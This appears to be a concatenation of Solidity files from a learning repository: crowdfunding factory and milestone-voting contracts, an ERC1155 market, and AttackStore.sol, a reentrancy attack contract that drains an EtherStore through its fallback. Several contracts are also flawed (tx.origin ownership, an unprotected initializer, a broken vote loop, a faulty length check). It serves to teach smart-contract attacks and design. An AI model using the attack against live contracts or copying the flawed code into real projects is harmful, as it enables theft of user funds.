//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/Clones.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./CrowdFundingContract.sol";

contract CrowdFundingFactory is Ownable {
    //state variable
    address immutable crowdFundingImplementation;
    address[] public _deployedContracts;
    uint256 public fundingFee = 0.000 ether;

    //events
    event newCrowdFundingCreated(
        address indexed owner,
        uint256 amount,
        address cloneAddress,
        string fundingCID
    );

    constructor(address _crowdFundingContract) {
        crowdFundingImplementation = _crowdFundingContract;
    }

    function createCrowdFundingContract(
        string memory _fundingCId,
        uint256 _amount,
        uint256 _duration
    ) external payable returns (address) {
        require(msg.value >= fundingFee, "deposit too small");
        address clone = Clones.clone(crowdFundingImplementation);
        (bool success, ) = clone.call(
            abi.encodeWithSignature(
                "initialize(string,uint256,uint256)",
                _fundingCId,
                _amount,
                _duration
            )
        );
        require(success, "creation failed");

        _deployedContracts.push(clone);
        emit newCrowdFundingCreated(msg.sender, fundingFee, clone, _fundingCId);
        return clone;
    }

    function deployedContracts() public view returns (address[] memory) {
        return _deployedContracts;
    }

    function withdrawFunds() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "nothing to withdraw");
        (bool success, ) = payable(msg.sender).call{value: balance}("");
        require(success, "withdraw failed");
    }

    receive() external payable {}
}

contracts/CrowdFund/CrowdFundingContract.content:
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

enum MilestoneStatus {
    Approved,
    Declined,
    Pending
}

contract CrowdFundingContract is Initializable {
    bool public campaignEnded;
    address payable private _campaignOwner;
    string public fundingCId;
    uint256 public targetAmount;
    uint256 public campaignDuration;
    uint256 private _amountDonated;
    uint256 private _numberOfDonors;
    uint32 private _milestoneCounter;
    uint256 private _approvedMilestone;
    uint256 private _numberOfWithdrawal;

    uint256 constant _baseNumber = 10**18;

    MilestoneStatus status;

    struct MilestoneVote {
        address donorAddress;
        bool vote;
    }

    struct Milestone {
        string milestoneCID;
        bool approved;
        uint256 votingPeriod;
        MilestoneStatus status;
        MilestoneVote[] votes;
    }

    mapping(address => uint256) public donors;
    mapping(uint256 => Milestone) public milestones;

    event fundsDonated(address indexed donor, uint256 amount, uint256 date);
    event fundsWithdrawn(address indexed owner, uint256 amount, uint256 date);
    event milestoneCreated(
        address indexed owner,
        uint256 datecreated,
        uint256 period
    );
    event milestoneRejected(uint256 yesvote, uint256 novote);

    function initialize(
        string calldata _fundingCId,
        uint256 _amount,
        uint256 _duration
    ) external initializer {
        _campaignOwner = payable(tx.origin);
        fundingCId = _fundingCId;
        targetAmount = _amount;
        campaignDuration = _duration;
    }

    function makeDonation() public payable {
        uint256 funds = msg.value;
        require(!campaignEnded, "campaign ended");
        require(funds > 0, "You did not donate");
        require(_numberOfWithdrawal != 3, "no longer taking donation");
        if (donors[msg.sender] == 0) {
            _numberOfDonors += 1;
        }

        donors[msg.sender] += funds;
        _amountDonated += funds;
        emit fundsDonated(msg.sender, funds, block.timestamp);
    }

    function creatNewMilestone(string memory milestoneCID, uint256 votingPeriod)
        public
    {
        require(msg.sender == _campaignOwner, "you not the owner");
        //check if we have a pending milestone
        //check if we have a pending milestone or no milestone at all
        require(
            milestones[_milestoneCounter].status != MilestoneStatus.Pending,
            "you have a pending milestone"
        );

        //check if all three milestone has been withdrawn
        require(_numberOfWithdrawal != 3, "no more milestone to create");

        //create a new milestone increment the milestonecounter
        _milestoneCounter++;

        //voting period for a minimum of 2 weeks before the proposal fails or passes
        Milestone storage newmilestone = milestones[_milestoneCounter];
        newmilestone.milestoneCID = milestoneCID;
        newmilestone.approved = false;
        newmilestone.votingPeriod = votingPeriod;
        newmilestone.status = MilestoneStatus.Pending;
        emit milestoneCreated(msg.sender, block.timestamp, votingPeriod);
    }

    function voteOnMilestone(bool vote) public {
        //check if the milestone is pending which means we can vote
        require(
            milestones[_milestoneCounter].status == MilestoneStatus.Pending,
            "can not vote on milestone"
        );
        //check if the person has voted already
        //milestone.votes

        //check if this person is a donor to the cause
        require(donors[msg.sender] != 0, "you are not a donor");

        uint256 counter = 0;
        uint256 milestoneVoteArrayLength = milestones[_milestoneCounter]
            .votes
            .length;
        bool voted = false;
        for (counter; counter < milestoneVoteArrayLength; ++counter) {
            MilestoneVote memory userVote = milestones[_milestoneCounter].votes[
                counter
            ];
            if (userVote.donorAddress == msg.sender) {
                //already voted
                voted = true;
                break;
            }
        }
        if (!voted) {
            //the user has not voted yet
            MilestoneVote memory userVote;
            //construct the user vote
            userVote.donorAddress = msg.sender;
            userVote.vote = vote;
            milestones[_milestoneCounter].votes.push(userVote);
        }
    }

    function etherBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawMilestone() public {
        require(payable(msg.sender) == _campaignOwner, "you not the owner");

        //check if the voting period is still on
        require(
            block.timestamp > milestones[_milestoneCounter].votingPeriod,
            "voting still on"
        );
        //check if milestone has ended
        require(
            milestones[_milestoneCounter].status == MilestoneStatus.Pending,
            "milestone ended"
        );

        //calculate the percentage
        (uint256 yesvote, uint256 novote) = _calculateTheVote(
            milestones[_milestoneCounter].votes
        );

        //calculate the vote percentage and make room for those that did not vote
        uint256 totalYesVote = _numberOfDonors - novote;

        //check if the yesVote is equal to 2/3 of the total votes
        uint256 twoThirdofTotal = (2 * _numberOfDonors * _baseNumber) / 3;
        uint256 yesVoteCalculation = totalYesVote * _baseNumber;

        //check if the milestone passed 2/3
        if (yesVoteCalculation >= twoThirdofTotal) {
            //the milestone succeds payout the money
            milestones[_milestoneCounter].approved = true;
            _numberOfWithdrawal++;
            milestones[_milestoneCounter].status = MilestoneStatus.Approved;
            //transfer 1/3 of the total balance of the contract
            uint256 contractBalance = address(this).balance;
            require(contractBalance > 0, "nothing to withdraw");
            uint256 amountToWithdraw;
            if (_numberOfWithdrawal == 1) {
                //divide by 3 1/3
                amountToWithdraw = contractBalance / 3;
            } else if (_numberOfWithdrawal == 2) {
                //second withdrawal 1/2
                amountToWithdraw = contractBalance / 2;
            } else {
                //final withdrawal
                amountToWithdraw = contractBalance;
                campaignEnded = true;
            }

            (bool success, ) = _campaignOwner.call{value: amountToWithdraw}("");
            require(success, "withdrawal failed");
            emit fundsWithdrawn(
                _campaignOwner,
                amountToWithdraw,
                block.timestamp
            );
        } else {
            //the milestone failed
            milestones[_milestoneCounter].status = MilestoneStatus.Declined;
            emit milestoneRejected(yesvote, novote);
        }
    }

    function _calculateTheVote(MilestoneVote[] memory votesArray)
        private
        pure
        returns (uint256, uint256)
    {
        uint256 yesNumber = 0;
        uint256 noNumber = 0;
        uint256 arrayLength = votesArray.length;
        uint256 counter = 0;

        for (counter; counter < arrayLength; ++counter) {
            if (votesArray[counter].vote == true) {
                ++yesNumber;
            } else {
                ++noNumber;
            }
        }

        return (yesNumber, noNumber);
    }

    function getDonation() public view returns (uint256) {
        return _amountDonated;
    }

    function campaignOwner() public view returns (address payable) {
        return _campaignOwner;
    }

    function numberOfDonors() public view returns (uint256) {
        return _numberOfDonors;
    }

    function showCurrentMillestone() public view returns (Milestone memory) {
        return milestones[_milestoneCounter];
    }

    receive() external payable {}
}

contract ProwdFundingContract is Initializable {
    //state variables
    bool public campaignEnded;
    address public _campaignOwner;
    string public fundingCID;
    uint256 public targetAmount;
    uint256 public campaignDuration;
    uint256 private _amountDonated;
    uint256 private _numberOfDonors;
    uint256 private _milestoneCounter;
    uint256 private _approvedMilestone;
    uint256 private _numberOfWithdrawals;

    struct Milestone {
        string milestoneCID;
        bool approved;
        MilestoneStatus status;
        uint256 votingPeriod;
        MilestoneVote[] votes;
    }

    struct MilestoneVote {
        address donor;
        bool vote;
    }

    event fundsDonated(address indexed owner, uint256 amount, uint256 date);
    event fundsWithdrawn(address indexed owner, uint256 amount, uint256 date);
    event milestoneCreated(address indexed owner, uint256 date, uint256 period);
    event milestoneRejected(uint256 yesVote, uint256 noVote);

    MilestoneStatus milestoneStatus;

    mapping(uint256 => Milestone) public milestones;
    mapping(address => uint256) public donors;

    function initialize(
        string memory _fundingCID,
        uint256 _amount,
        uint256 _duration
    ) external payable {
        _campaignOwner = tx.origin;
        fundingCID = _fundingCID;
        targetAmount = _amount;
        campaignDuration = _duration;
    }

    function createNewMilestone(
        string memory _milestoneCID,
        uint256 _votingPeriod
    ) external {
        require(msg.sender == _campaignOwner);
        // check if we have a pending milestone
        require(
            milestones[_milestoneCounter].status != MilestoneStatus.Pending
        );
        //check if all three milestone has been withdrawn
        require(_numberOfWithdrawals != 3, "too many withdrawals");
        // create new milestone
        _milestoneCounter++;
        //voting period for a minimum of 2 weeks before the proposal fails or passes
        Milestone storage milestone = milestones[_milestoneCounter];
        milestone.milestoneCID = _milestoneCID;
        milestone.approved = false;
        milestone.status = MilestoneStatus.Pending;
        milestone.votingPeriod = _votingPeriod;
        emit milestoneCreated(msg.sender, block.timestamp, _votingPeriod);
    }

    function makeDonation() external payable {
        uint256 funds = msg.value;
        require(funds > 0, "funds must be greater than 0");
        require(!campaignEnded, "campaign has ended");
        require(_numberOfWithdrawals != 3, "no longer taking withdrawals");

        if (donors[msg.sender] == 0) {
            _numberOfDonors += 1;
        }

        donors[msg.sender] += funds;
        _amountDonated += funds;
        emit fundsDonated(msg.sender, funds, block.timestamp);
    }

    function voteOnMilestone(bool vote) external {
        require(
            milestones[_milestoneCounter].status == MilestoneStatus.Pending,
            "Milestone status must be Pending"
        );
        require(donors[msg.sender] != 0, "Must have donated");
        uint256 counter = 0;
        uint256 milestoneArrayLength = milestones[_milestoneCounter]
            .votes
            .length;
        bool voted = false;
        for (counter; counter < milestoneArrayLength; counter++) {
            MilestoneVote memory milestoneVote = milestones[_milestoneCounter]
                .votes[counter];

            if (milestoneVote.donor == msg.sender) {
                // already voted
                voted = true;
                break;
            }
            if (!voted) {
                //the user has not voted yet
                MilestoneVote memory userVote;
                //construct user vote
                userVote.donor = msg.sender;
                userVote.vote = vote;
                milestones[_milestoneCounter].votes.push(milestoneVote);
            }
        }
    }

    function _calculateTheVote(MilestoneVote[] memory votes)
        private
        pure
        returns (uint256, uint256)
    {
        uint256 counter = 0;
        uint256 votesArrayLength = votes.length;
        uint256 voteYes;
        uint256 voteNo;
        for (counter; counter < votesArrayLength; ++counter) {
            if (votes[counter].vote == true) {
                voteYes++;
            } else {
                voteNo++;
            }
        }

        return (voteYes, voteNo);
    }

    function etherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contracts/ERC1155/Market.sol.content:
//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../Tokens/DaiToken.sol";
import "./Crops.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Market is Ownable, ERC1155Holder {
    struct UserInfo {
        uint256 lastUpdated;
        uint256 pointsDebt;
        uint256 stakedAmount;
    }

    struct NFTInfo {
        uint256 id;
        uint256 remaining;
        uint256 price;
    }

    DaiToken public dai;
    Crops public crops;

    mapping(address => UserInfo) public userInfo;
    NFTInfo[] public nftInfo;

    constructor(
        DaiToken _dai,
        Crops _crops,
        uint256 _emissionRate
    ) {
        dai = _dai;
        crops = _crops;
        _emissionRate = _emissionRate;
    }

    function addNfts(
        uint256[] calldata _ids,
        uint256[] calldata _totals,
        uint256[] calldata _prices
    ) external onlyOwner {
        require(
            _ids.length == _totals.length || _totals.length == _prices.length,
            "Incorrect array length"
        );

        crops.safeBatchTransferFrom(
            msg.sender,
            address(this),
            _ids,
            _totals,
            ""
        );

        for (uint256 i = 0; i < _ids.length; i++) {
            nftInfo.push(
                NFTInfo({id: _ids[i], remaining: _totals[i], price: _prices[i]})
            );
        }
    }

    function claimNfts(
        uint256[] calldata _nftIndexes,
        uint256[] calldata _quantities
    ) external {
        require(
            _nftIndexes.length == _quantities.length,
            "Incorrect array length"
        );

        for (uint64 i; i < _nftIndexes.length; i++) {
            NFTInfo storage nft = nftInfo[_nftIndexes[i]];
            uint256 cost = nft.price * _quantities[i];
            uint256 points = pointsBalance(msg.sender);
            require(
                nft.remaining > _quantities[i],
                "Not enough crops in NFT Farm"
            );
            require(points >= cost, "Insufficient points");
            UserInfo memory user = userInfo[msg.sender];

            user.pointsDebt = points - cost;
            user.lastUpdated = block.timestamp;
            userInfo[msg.sender] = user;
            nft.remaining -= _quantities[i];
        }

        crops.safeBatchTransferFrom(
            address(this),
            msg.sender,
            _nftIndexes,
            _quantities,
            ""
        );
    }

    function pointsBalance(address userAddress) public returns (uint256) {}

    function executeTransaction(
        address[] calldata targets,
        bytes[] calldata data
    ) external onlyOwner {
        require(targets.length == data.length, "array lengths dont match");
        uint256 i = 0;
        for (i; i < targets.length; i++) {
            (bool success, bytes memory reason) = targets[i].call(data[i]);
            require(success, string(reason));
        }
    }
}

contracts/Reentrancy/AttackStore.sol.content:
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "./EtherStore.sol";
import "hardhat/console.sol";

contract AttackStore {
    EtherStore etherStore;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    function attack() external payable {
        require(address(etherStore).balance > 0);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // msg.data is empty, recieve will be called. As there is no recieve function fallback will be called
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance > 0) {
            etherStore.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

